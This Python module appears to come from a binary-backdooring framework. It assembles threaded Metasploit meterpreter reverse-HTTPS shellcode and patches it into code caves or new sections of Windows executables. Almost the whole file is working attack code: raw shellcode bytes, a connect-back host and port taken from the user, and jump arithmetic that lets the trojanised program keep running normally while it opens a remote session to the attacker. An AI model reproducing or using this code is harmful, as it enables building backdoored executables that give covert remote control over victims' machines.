import struct
import os
import logging
from core import enum
from core import support

from pe.core import eat_code_caves
logger = logging.getLogger(__name__)


class meterpreter_reverse_https_threaded():

    def __init__(self):
        #could take this out HOST/PORT and put into each shellcode function
        #self.HOST = HOST
        #self.PORT = PORT
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "meterpreter_reverse_https_threaded"
        self.description = """Compatable with meterpreter reverse https payload from MSF"""
        self.requirements = {'MODE':'How the patching will happen',
                             'HOST':'<HOST to connect back to>',
                             'PORT':'<Port to connect back to>',
                             'ENCODER': '<Encoder you want to use, else none>'
                            }
        self.supported_modes = ['add_section',
                                'single_cave',
                                'cave_jumping'
                                ]
        self.shellcode = ""
        self.stackpreserve = b"\x90\x90\x60\x9c"
        self.stackrestore = b"\x9d\x61"
        self.apis_needed = None
        self.payload_type = 'staged'
        
    def invoke(self, PM):
        # Expose patching method objects
        
        self.PM = PM
        # Expose BDF method objects
        self.BDF = self.PM.BDF
        logger.debug(f"IN PAYLOAD DEBUG: {dir(self)}")
        if support.support(self).check_reqs() is False:
            return False
        return self.run()


    def run(self):

        """
        Traditional meterpreter reverse https shellcode from metasploit
        modified to support cave jumping.
        """

        #Begin shellcode 2:
        
        if self.MODE.lower() == 'cave_jumping':
            self.shellcode2 = b"\xe8"
            breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 1)
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                             len(self.shellcode2) + 241).rstrip("L")), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                             breakupvar + 241).rstrip("L")), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                             len(self.shellcode2) + 234).rstrip("L")), 16))
        else:
            self.shellcode2 = b"\xE8\xB7\xFF\xFF\xFF"

        if self.MODE.lower() != 'add_section':
            if 'CavesPicked' in self.BDF.pe_object:
                self.shellcode2 += self.PM.BDF.pe_object['CleanCavesStub']

            else:
                self.shellcode2 += b"\x41" * 58

        
        self.shellcode2 += bytes("\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
                            "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x31\xff\x0f\xb7\x4a\x26"
                            "\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49"
                            "\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78"
                            "\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x58\x20\x8b\x48\x18\x01\xd3"
                            "\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xc1"
                            "\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24"
                            "\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
                            "\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59"
                            "\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d"
                            "\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26"
                            "\x07\xff\xd5\x31\xdb\x53\x53\x53\x53\x53\xe8\x3e\x00\x00\x00"
                            "\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69"
                            "\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x54"
                            "\x72\x69\x64\x65\x6e\x74\x2f\x37\x2e\x30\x3b\x20\x72\x76\x3a"
                            "\x31\x31\x2e\x30\x29\x20\x6c\x69\x6b\x65\x20\x47\x65\x63\x6b"
                            "\x6f\x00\x68\x3a\x56\x79\xa7\xff\xd5\x53\x53\x6a\x03\x53\x53"
                            "\x68", 'iso-8859-1')
        self.shellcode2 += struct.pack("<H", int(self.PORT))
        self.shellcode2 += bytes("\x00\x00\xe8\x51\x01\x00\x00\x2f\x35\x73\x52\x4e"
                            "\x51\x48\x42\x46\x70\x75\x77\x56\x35\x52\x54\x6b\x64\x64\x69"
                            "\x43\x4d\x51\x5a\x75\x34\x43\x57\x57\x67\x62\x73\x75\x32\x32"
                            "\x4f\x51\x38\x51\x64\x79\x4e\x56\x4c\x4a\x33\x38\x4f\x33\x30"
                            "\x68\x61\x74\x68\x59\x4e\x4a\x6e\x4b\x4c\x45\x30\x44\x4e\x71"
                            "\x6d\x76\x44\x53\x4f\x6b\x7a\x66\x68\x71\x79\x4e\x58\x5a\x57"
                            "\x43\x30\x54\x43\x6b\x79\x52\x2d\x4e\x38\x45\x43\x33\x53\x4f"
                            "\x44\x37\x74\x68\x37\x4d\x4a\x71\x4e\x72\x7a\x45\x73\x55\x54"
                            "\x4b\x6e\x72\x66\x2d\x4e\x6d\x43\x65\x44\x78\x4e\x74\x4c\x33"
                            "\x44\x59\x41\x31\x4b\x6c\x49\x46\x59\x32\x31\x76\x32\x79\x62"
                            "\x56\x66\x31\x75\x48\x6d\x56\x34\x32\x55\x46\x70\x36\x35\x67"
                            "\x51\x77\x51\x35\x63\x52\x6c\x2d\x44\x2d\x73\x61\x75\x59\x50"
                            "\x37\x52\x47\x33\x43\x67\x77\x4b\x4e\x54\x77\x69\x59\x57\x77"
                            "\x6c\x62\x63\x5a\x35\x64\x34\x61\x00\x50\x68\x57\x89\x9f\xc6"
                            "\xff\xd5\x89\xc6\x53\x68\x00\x32\xe8\x84\x53\x53\x53\x57\x53"
                            "\x56\x68\xeb\x55\x2e\x3b\xff\xd5\x96\x6a\x0a\x5f\x68\x80\x33"
                            "\x00\x00\x89\xe0\x6a\x04\x50\x6a\x1f\x56\x68\x75\x46\x9e\x86"
                            "\xff\xd5\x53\x53\x53\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85"
                            "\xc0\x75\x14\x68\x88\x13\x00\x00\x68\x44\xf0\x35\xe0\xff\xd5"
                            "\x4f\x75\xcd\xe8\x46\x00\x00\x00\x6a\x40\x68\x00\x10\x00\x00"
                            "\x68\x00\x00\x40\x00\x53\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53"
                            "\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89"
                            "\xe2\xff\xd5\x85\xc0\x74\xcf\x8b\x07\x01\xc3\x85\xc0\x75\xe5"
                            "\x58\xc3\x5f\xe8\x6b\xff\xff\xff", 'iso-8859-1')
        self.shellcode2 += bytes(self.HOST, 'iso-8859-1')
        self.shellcode2 += b"\x00"

        #shellcode1 is the thread
        self.shellcode1 = bytes("\xFC\x90\xE8\xC1\x00\x00\x00\x60\x89\xE5\x31\xD2\x90\x64\x8B"
                           "\x52\x30\x8B\x52\x0C\x8B\x52\x14\xEB\x02"
                           "\x41\x10\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61"
                           "\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\x49\x75\xEF\x52\x90\x57\x8B"
                           "\x52\x10\x90\x8B\x42\x3C\x01\xD0\x90\x8B\x40\x78\xEB\x07\xEA\x48"
                           "\x42\x04\x85\x7C\x3A\x85\xC0\x0F\x84\x68\x00\x00\x00\x90\x01\xD0"
                           "\x50\x90\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x58\x49\x8B\x34\x8B"
                           "\x01\xD6\x31\xFF\x90\x31\xC0\xEB\x04\xFF\x69\xD5\x38\xAC\xC1\xCF"
                           "\x0D\x01\xC7\x38\xE0\xEB\x05\x7F\x1B\xD2\xEB\xCA\x75\xE6\x03\x7D"
                           "\xF8\x3B\x7D\x24\x75\xD4\x58\x90\x8B\x58\x24\x01\xD3\x90\x66\x8B"
                           "\x0C\x4B\x8B\x58\x1C\x01\xD3\x90\xEB\x04\xCD\x97\xF1\xB1\x8B\x04"
                           "\x8B\x01\xD0\x90\x89\x44\x24\x24\x5B\x5B\x61\x90\x59\x5A\x51\xEB"
                           "\x01\x0F\xFF\xE0\x58\x90\x5F\x5A\x8B\x12\xE9\x53\xFF\xFF\xFF\x90"
                           "\x5D\x90", 'iso-8859-1'
                           )

        self.shellcode1 += b"\xBE"
        self.shellcode1 += struct.pack("<H", len(self.shellcode2) - 5)
        self.shellcode1 += b"\x00\x00"  # <---Size of shellcode2 in hex
        self.shellcode1 += bytes("\x90\x6A\x40\x90\x68\x00\x10\x00\x00"
                            "\x56\x90\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x90"
                            "\x89\xF1", 'iso-8859-1'
                            )

        if self.MODE.lower() == 'cave_jumping':
            self.shellcode1 += b"\xe9"
            breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 1)

            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += b"\xeb\x44"   # <--length of shellcode below
        self.shellcode1 += b"\x90\x5e"
        self.shellcode1 += bytes("\x90\x90\x90"
                            "\xF2\xA4"
                            "\xE8\x20\x00\x00"
                            "\x00\xBB\xE0\x1D\x2A\x0A\x90\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06"
                            "\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF"
                            "\xD5\x31\xC0\x50\x50\x50\x53\x50\x50\x68\x38\x68\x0D\x16\xFF\xD5"
                            "\x58\x58\x90\x61", 'iso-8859-1'
                            )

        
        if self.MODE.lower() == 'cave_jumping':
            breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 2)
            self.shellcode1 += b"\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 3).rstrip("L")), 16))
        else:
            self.shellcode1 += b"\xe9"
            self.shellcode1 += struct.pack("<I", len(self.shellcode2))

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return self.stackpreserve + self.shellcode1, self.shellcode2
